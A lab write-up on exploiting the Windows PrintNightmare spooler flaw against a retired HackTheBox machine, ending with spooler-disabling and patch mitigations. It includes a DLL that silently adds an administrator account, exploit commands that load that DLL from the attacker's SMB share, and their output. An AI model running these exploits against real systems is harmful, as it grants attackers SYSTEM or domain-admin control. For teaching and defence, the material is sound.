# Playing with PrintNightmare

[hackthebox](/tags#hackthebox ) [htb-heist](/tags#htb-heist )
[cve-2021-1675](/tags#cve-2021-1675 ) [cve-2021-34527](/tags#cve-2021-34527 )
[printnightmare](/tags#printnightmare ) [evil-winrm](/tags#evil-winrm )
[invoke-nightmare](/tags#invoke-nightmare )
[sharpprintnightmare](/tags#sharpprintnightmare ) [dll](/tags#dll )
[samba](/tags#samba ) [visual-studio](/tags#visual-studio ) [htb-
hackback](/tags#htb-hackback )  
  
Jul 8, 2021

Playing with PrintNightmare

![cascade](https://0xdfimages.gitlab.io/img/printnightmare-cover.png)

CVE-2021-34527, or PrintNightmare, is a vulnerability in the Windows Print
Spooler that allows for a low priv user to escalate to administrator on a
local box or on a remote server. This is especially bad because it is not
uncommon for Domain Controllers to have an exposed print spooler, and thus,
this exploit can take an attacker from low-priv user to domain admin. There
are a few proof of concept exploits out there, and I wanted to give them a
spin an old HackTheBox machine. I’ll also look at disabling the Print Spooler
and how it breaks the exploits, and discuss the July 6 patch.

## Background

### History

The history on this bug is kind of interesting. Microsoft released a patch for
a [Windows Print Spooler Remote Code Execution
Vulnerability](https://msrc.microsoft.com/update-
guide/vulnerability/CVE-2021-1675) on June 8, 2021, known as CVE-2021-1675.
Seeing this patch, researchers in China were working on a proof of concept for
a very similar bug in the print spooler, and on seeing the patch, they
published their exploit on GitHub. Only they weren’t the same bug. The
researchers later took down their exploit, but once something had hit the
internet, the damage had been done.

Microsoft later updated the patch for CVE-2021-1675 (and updated the class
from a privilege escalation to remote code execution) on July 2.

On July 6, Microsoft issued an out-of-band update (not on [Patch
Tuesday](https://en.wikipedia.org/wiki/Patch_Tuesday)), but it’s unclear based
on the discussions on Twitter as to if this patch fully remediates the issue.
At the time of this post, they best flowchart to determine if the exploit will
work is from [this
tweet](https://twitter.com/wdormann/status/1412906574998392840):

> This is my current understanding of the
> [#PrintNightmare](https://twitter.com/hashtag/PrintNightmare?src=hash&ref_src=twsrc%5Etfw)
> exploitability flowchart.  
> There's a small disagreement between me and MSRC at the moment about
> UpdatePromptSettings vs. NoWarningNoElevationOnUpdate, but I think it
> doesn't matter much as I just have both for now.
> [pic.twitter.com/huIghjwTFq](https://t.co/huIghjwTFq)
>
> — Will Dormann (@wdormann) [July 7,
> 2021](https://twitter.com/wdormann/status/1412906574998392840?ref_src=twsrc%5Etfw)

For a larger version of that image, click [here](/files/printnightmare-
flowchart.jpeg).

The story continues to change daily…There was a patch released on July 6, and
I’ll discuss that a but in the Mitigrations section at the end of the post.
Because I’m going to be playing with unpatched machines in the HackTheBox lab,
the various POCs I’m showing will work without much issue. It is important to
note that the Cube0x0 Impact exploit targets a different exploit path from the
Cube0x0 SharpNightmare version, meaning that a patch the fixes one may or may
not fix the other, so it’s worth showing them all.

### Vulnerability

The vulnerability itself is with how a low privilege authenticated user is
able to add a printer, and specifically providing a driver for that printer.
The process checks that the user is authenticated and then grants them SYSTEM
level access to install drivers for the printer.

This means that with a low priv shell on a windows box, or with valid
credentials remotely, an attacker can get SYSTEM privileges on a host.

### Target

I’ll demo different PrintNightmare exploits on [Heist](/2019/11/30/htb-
heist.html) from HackTheBox. It’s a really nice retired Windows Machine, and
it’s freely available to all players for HTB’s [Take it Easy
July](https://twitter.com/hackthebox_eu/status/1410627325838905345) event.
It’s also nice because there are two users that I get credentials for in
solving the box.

The hazard user has access to SMB and RPC using the password stealth1agent:

    
    
    oxdf@parrot$ rpcclient -U 'hazard%stealth1agent' 10.10.10.149
    rpcclient $> ^C
    oxdf@parrot$ smbmap -H 10.10.10.149 -u hazard -p stealth1agent
    [+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      
            Disk                                                    Permissions     Comment
            ----                                                    -----------     -------
            ADMIN$                                                  NO ACCESS       Remote Admin
            C$                                                      NO ACCESS       Default share
            IPC$                                                    READ ONLY       Remote IPC
    

hazard cannot get a shell on Heist, but the chase user can get a low privilege
shell using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

    
    
    oxdf@parrot$ evil-winrm -i 10.10.10.149 -u SUPPORTDESK\\chase -p 'Q4)sJu\Y8qz*A3?d'
    
    Evil-WinRM shell v2.4
    
    Info: Establishing connection to remote endpoint
    
    *Evil-WinRM* PS C:\Users\Chase\Documents>
    

## Exploit Examples

### Invoke-Nightmare LPE

[Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675) is a
PowerShell script developed by Caleb Stewart and John Hammond, and it’s quite
slick. I’ll clone their repo to my host, and rename the directory to avoid
confusion:

    
    
    oxdf@parrot$ git clone https://github.com/calebstewart/CVE-2021-1675
    Cloning into 'CVE-2021-1675'...
    remote: Enumerating objects: 40, done.
    remote: Counting objects: 100% (40/40), done.
    remote: Compressing objects: 100% (32/32), done.
    remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
    Receiving objects: 100% (40/40), 131.12 KiB | 3.97 MiB/s, done.
    Resolving deltas: 100% (9/9), done.
    oxdf@parrot$ mv CVE-2021-1675 invoke-nightmare
    

With the shell as chase, I’ll upload the `.ps1` file to Heist:

    
    
    *Evil-WinRM* PS C:\programdata> upload /opt/invoke-nightmare/CVE-2021-1675.ps1
    Info: Uploading /opt/invoke-nightmare/CVE-2021-1675.ps1 to C:\programdata\CVE-2021-1675.ps1
    
    Data: 238080 bytes of 238080 bytes copied
    
    Info: Upload successful!
    

I’ll import the module:

    
    
    *Evil-WinRM* PS C:\programdata> Import-Module .\CVE-2021-1675.ps1
    

Now I have access to the `Invoke-Nightmare` command. With no args, this will
add a user admin with password “P@ssw0rd”, or I can give it a username and
password myself:

    
    
    *Evil-WinRM* PS C:\programdata> Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
    [+] created payload at C:\Users\Chase\AppData\Local\Temp\nightmare.dll
    [+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll"                                                
    [+] added user 0xdf as local administrator
    [+] deleting payload from C:\Users\Chase\AppData\Local\Temp\nightmare.dll  
    

0xdf is now a user on the host, and in the Administrators group:

    
    
    *Evil-WinRM* PS C:\programdata> net user 0xdf
    User name                    0xdf
    Full Name                    0xdf
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never
    
    Password last set            7/8/2021 7:08:26 AM
    Password expires             Never
    Password changeable          7/8/2021 7:08:26 AM
    Password required            Yes
    User may change password     Yes
    
    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   Never
    
    Logon hours allowed          All
    
    Local Group Memberships      *Administrators
    Global Group memberships     *None
    The command completed successfully.
    

I can connect over Evil-WinRM and access anything, like `root.txt`:

    
    
    oxdf@parrot$ evil-winrm -i 10.10.10.149 -u 0xdf -p 0xdf0xdf
    
    Evil-WinRM shell v2.4
    
    Info: Establishing connection to remote endpoint
    
    *Evil-WinRM* PS C:\Users\0xdf\Documents> cd ..\..\administrator\desktop
    *Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
    50dfa3c6************************
    

### Cube0x0 Impacket RCE

#### Scanning

Cube0x0 gives a way to test if the box is vulnerable using `rpcdump.py`, and
Heist is:

    
    
    oxdf@parrot$ rpcdump.py @10.10.10.149 | grep MS-RPRN
    Protocol: [MS-RPRN]: Print System Remote Protocol 
    

#### DLL

[Cube0x0’s exploit](https://github.com/cube0x0/CVE-2021-1675) for
PrintNightmare works remotely with creds. First, I’ll need to build a Dll.
I’ve walked through this in [detail before for HackBack](/2019/07/06/htb-
hackback.html#arbitrary-write--diaghub--system). I’ll follow a similar set of
steps to create a C++ DLL project, and use the following source for my Dll:

    
    
    // dllmain.cpp : Defines the entry point for the DLL application.
    #include "pch.h"
    #include <stdlib.h>
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c net user 0xdf 0xdf0xdf /add");
            system("cmd.exe /c net localgroup administrators 0xdf /add");
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    

The `DllMain` function will be called for various reasons, one of which is
when a process loads the DLL. In that case, the `ul_reason_for_call` will be
`DLL_PROCESS_ATTACH`. So the DLL will be loaded, will execute these two system
commands, and then be done. I’ll compile that and copy it back to my Parrot
VM.

#### Samba

Cube0x0 has an example Samba config to allow for anonymous access on his
GitHub page. It’s important that the user on the last line exists on your
host. I updated mine to match a user I had configured with access to nothing.

    
    
    [global]
        map to guest = Bad User
        server role = standalone server
        usershare allow guests = yes
        idmap config * : backend = tdb
        smb ports = 445
    
    [share]
        comment = Samba
        path = /srv/smb/
        guest ok = yes
        read only = no
        browsable = yes
        force user = nobody
    

I’ll restart Samba to take the updated config:

    
    
    oxdf@parrot$ sudo service smbd restart 
    

It’s also important that that user can read from the SMB share, so I’ll set
that directory to be owned by that user:

    
    
    oxdf@parrot$ sudo chown -R nobody:root smb/
    oxdf@parrot$ sudo chmod -R 777 smb/
    oxdf@parrot$ ls -l smb/
    total 12
    -rwxrwxrwx 1 nobody root 10240 Jul  7 22:10 AddUserDll.dll
    

#### Impacket

I’ll clone the repo and rename it:

    
    
    oxdf@parrot$ cd /opt/
    oxdf@parrot$ git clone https://github.com/cube0x0/CVE-2021-1675
    Cloning into 'CVE-2021-1675'...
    remote: Enumerating objects: 159, done.
    remote: Counting objects: 100% (159/159), done.
    remote: Compressing objects: 100% (98/98), done.
    remote: Total 159 (delta 55), reused 124 (delta 32), pack-reused 0
    Receiving objects: 100% (159/159), 1.45 MiB | 7.37 MiB/s, done.
    Resolving deltas: 100% (55/55), done.
    oxdf@parrot$ mv CVE-2021-1675 SharpPrintNightmare
    oxdf@parrot$ cd SharpPrintNightmare/
    

This exploit uses a modified version of
[Impacket](https://github.com/cube0x0/impacket). I’ll clone that into this
directory:

    
    
    oxdf@parrot$ git clone https://github.com/cube0x0/impacket
    Cloning into 'impacket'...
    remote: Enumerating objects: 19570, done.
    remote: Counting objects: 100% (645/645), done.
    remote: Compressing objects: 100% (304/304), done.
    remote: Total 19570 (delta 386), reused 531 (delta 339), pack-reused 18925
    Receiving objects: 100% (19570/19570), 6.82 MiB | 9.18 MiB/s, done.
    Resolving deltas: 100% (14798/14798), done.
    

To avoid messing up my system install, I’ll create a virtual environment,
activate it, and install Impacket in there:

    
    
    oxdf@parrot$ python3 -m venv venv
    oxdf@parrot$ source venv/bin/activate
    (venv) oxdf@parrot$ cd impacket/
    (venv) oxdf@parrot$ python3 setup.py install
    running install
    running bdist_egg
    running egg_info 
    ...[snip]...
    

#### Run Exploit

With all the pieces assembled, I can run the exploit. I’ll give it the creds
for the hazard user which work for an RPC connection, as well as the path to
the DLL on the SMB share:

    
    
    (venv) oxdf@parrot$ python3 CVE-2021-1675.py 'HEIST/hazard:stealth1agent@10.10.10.149' '\\10.10.14.200\share\AddUserDll.dll'
    [*] Connecting to ncacn_np:10.10.10.149[\PIPE\spoolss]
    [+] Bind OK
    [+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
    [*] Executing \\10.10.14.200\share\AddUserDll.dll
    [*] Try 1...
    [*] Stage0: 0
    [*] Stage2: 0
    [+] Exploit Completed
    

It worked!

If it throws an error, he’s what some troubleshooting showed me:

Error | Reason  
---|---  
`impacket.dcerpc.v5.rpcrt.DCERPCException: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied ` | permissions on the file in the SMB share  
`impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0x525 - ERROR_NO_SUCH_USER - The specified account does not exist.` | user in `smbd.conf` doesn’t exist  
  
I can now log in as 0xdf with admin privs:

    
    
    oxdf@parrot$ evil-winrm -i 10.10.10.149 -u 0xdf -p 0xdf0xdf
    
    Evil-WinRM shell v2.4
    
    Info: Establishing connection to remote endpoint
    
    *Evil-WinRM* PS C:\Users\0xdf\Documents> cd ..\..\administrator\desktop
    *Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
    50dfa3c6************************
    

### SharpPrintNightmare LPE/RCE

#### Build

Cube0x0’s repo has a Visual Studio project in it for `SharpPrintNightmare`.
I’ll download the repo to my Windows VM, and open `SharpPrintNightmare.sln` a
couple directories deep. I’ll select Built –> Build Solution, and it builds:

    
    
    1>------ Build started: Project: SharpPrintNightmare, Configuration: Release Any CPU ------
    1>  SharpPrintNightmare -> C:\Users\0xdf\Desktop\CVE-2021-1675-main\SharpPrintNightmare\SharpPrintNightmare\bin\Release\SharpPrintNightmare.exe
    ========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
    

#### LPE

I’ll copy that `.exe` back to my Linux VM. I’ll upload both the `.exe` and the
`.dll` to Heist (though I could also host the `.dll` on an SMB share like in
the previous):

    
    
    *Evil-WinRM* PS C:\programdata> upload /opt/SharpPrintNightmare/AddUserDll.dll
    Info: Uploading /opt/SharpPrintNightmare/AddUserDll.dll to C:\programdata\AddUserDll.dll
                                                                 
    Data: 13652 bytes of 13652 bytes copied
    
    Info: Upload successful!
    
    *Evil-WinRM* PS C:\programdata> upload /opt/SharpPrintNightmare/SharpPrintNightmare.exe
    Info: Uploading /opt/SharpPrintNightmare/SharpPrintNightmare.exe to C:\programdata\SharpPrintNightmare.exe
                                                                 
    Data: 18432 bytes of 18432 bytes copied
    
    Info: Upload successful!
    

Now I just run `SharpPrintNightmare.exe` passing it the path to the DLL to run
as SYSTEM:

    
    
    *Evil-WinRM* PS C:\programdata> .\SharpPrintNightmare.exe \programdata\AddUserDll.dll
    [*] pDriverPath C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll
    [*] Executing \programdata\AddUserDll.dll
    [*] Try 1...
    [*] Stage 0: 0
    [*] Try 2...
    [*] Stage 0: 0
    [*] Stage 2: 0
    [+] Exploit Completed
    

0xdf has been added:

    
    
    *Evil-WinRM* PS C:\programdata> net user 0xdf
    User name                    0xdf
    Full Name
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never
    
    Password last set            7/8/2021 8:18:24 AM
    Password expires             Never
    Password changeable          7/8/2021 8:18:24 AM
    Password required            Yes
    User may change password     Yes
    
    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   Never
    
    Logon hours allowed          All
    
    Local Group Memberships      *Administrators       *Users
    Global Group memberships     *None
    The command completed successfully.
    

And Evil-WinRM works as well:

    
    
    oxdf@parrot$ evil-winrm -i 10.10.10.149 -u 0xdf -p 0xdf0xdf
    
    Evil-WinRM shell v2.4
    
    Info: Establishing connection to remote endpoint
    
    *Evil-WinRM* PS C:\Users\0xdf\Documents>
    

#### RCE

The same EXE can be run to get remote execution from Windows. I had a tough
time getting it working:

    
    
    PS > .\SharpPrintNightmare.exe '\\10.10.14.200\share\AddUserDll.dll' \\10.10.10.149 heist hazard stealth1agent
    [*] pDriverPath C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
    [*] Executing \\10.10.14.200\share\AddUserDll.dll
    [*] Try 1...
    [*] Stage 0: 5
    [*] Try 2...
    [*] Stage 0: 5
    [*] Try 3...
    [*] Stage 0: 5
    

It would try three times and stop. It’s possible I screwed up my SMB server.
Or that something else is wrong. I do know you have to run as a user in the
administrators group, but I tried both as 0xdf (who is in administrators) and
with PowerShell running as Administrator.

## Mitigation

### Disable Spooler

Up until a couple days ago, the only mitigation was to disable the print
spooler service.

From an admin shell (like 0xdf), I can do that with the following commands:

    
    
    *Evil-WinRM* PS C:\Users\0xdf\Documents> stop-service -name spooler -force
    *Evil-WinRM* PS C:\Users\0xdf\Documents> set-service -name spooler -startuptype disabled
    

The first disables the service currently, and the second will have it not
start on reboot. The second isn’t really important on a HTB machine, as it
will restore to a snapshot where the service is enabled and running, but I run
it here just to show the best practice.

Once this is done, `rpcdump.py @10.10.10.149 | grep MS-RPRN` no longer shows the service, and the exploit no longer works.

Invoke-Nightmare:

    
    
    *Evil-WinRM* PS C:\programdata> Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
    [+] created payload at C:\Users\Chase\AppData\Local\Temp\nightmare.dll
    [!] failed to get current driver list
    

Impacket RCE:

    
    
    (venv) oxdf@parrot$ python3 CVE-2021-1675.py 'HEIST/hazard:stealth1agent@10.10.10.149' '\\10.10.14.200\share\AddUserDll.dll'
    [*] Connecting to ncacn_np:10.10.10.149[\PIPE\spoolss]
    [-] Connection Failed
    

SharpPrintNightmare:

    
    
    *Evil-WinRM* PS C:\programdata> .\SharpPrintNightmare.exe \programdata\AddUserDll.dll
    SharpPrintNightmare.exe : 
        + CategoryInfo          : NotSpecified: (:String) [], RemoteException
        + FullyQualifiedErrorId : NativeCommandError
    Unhandled Exception: System.ComponentModel.Win32Exception: The RPC server is unavailable
       at SharpPrintNightmare.Program.getDrivers()
       at SharpPrintNightmare.Program.Main(String[] args)
    

### July 6 Patch

From what I’ve been able to read, the July 6 patch for CVE-2021-34527 fixes
part of the vulnerability. Now administrator access is required to install any
unsigned printer driver. While there are plenty of cases of [signed
malware](https://arstechnica.com/gadgets/2021/06/microsoft-digitally-signs-
malicious-rootkit-driver/), this is still a solid step forward. Additionally
there’s a new registry key, `RestrictDriverInstallationToAdministrators`,
which will block all driver installation by non-administrator users, which
seems like a good thing to try, as it prevents local privilege escalation
entirely.

There is still a workaround for it, involving the “Point&Print” service. From
it’s updated [security bulletin](https://msrc.microsoft.com/update-
guide/vulnerability/CVE-2021-34527):

> UPDATE July 7, 2021: The security update for Windows Server 2012, Windows
> Server 2016 and Windows 10, Version 1607 have been released. Please see the
> Security Updates table for the applicable update for your system. We
> recommend that you install these updates immediately. If you are unable to
> install these updates, see the FAQ and Workaround sections in this CVE for
> information on how to help protect your system from this vulnerability.
>
> In order to secure your system, you must confirm that the following registry
> settings are set to 0 (zero) or are not defined (**Note** : These registry
> keys do not exist by default, and therefore are already at the secure
> setting.):
>
>   * HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows
> NT\Printers\PointAndPrint
>   * NoWarningNoElevationOnInstall = 0 (DWORD) or not defined (default
> setting)
>   * NoWarningNoElevationOnUpdate = 0 (DWORD) or not defined (default
> setting)
>

[](/2021/07/08/playing-with-printnightmare.html)

